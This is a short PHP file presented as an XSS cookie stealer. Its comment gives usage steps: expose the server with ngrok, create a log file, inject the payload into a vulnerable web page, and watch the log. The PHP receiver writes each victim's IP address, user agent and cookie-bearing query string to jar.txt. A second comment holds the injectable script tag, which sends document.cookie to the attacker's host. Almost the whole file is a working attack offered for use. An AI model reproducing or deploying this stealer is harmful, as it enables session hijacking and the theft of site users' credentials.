	<!-- 
	Cookie stealer web vulnerable xss:
	- start ngrock on the apache port (work better with apache)
	- make a "jar.txt" in the same dir with "get.php"
	- send the script in the comment forward to the vulnerable place in the web application
	- execute "watch cat jar.txt" command to see the result.
 -->

<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt', 'a');

fwrite($fp, $ip. ' '.$browser. " \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);
?>


<!-- 
	This is the comment to paste in the vulnerable area.

<script>var i = new Image(); i.src="[REMOTE_ADDR]/get.php?cookie="+escape(document.cookie)</script>

 -->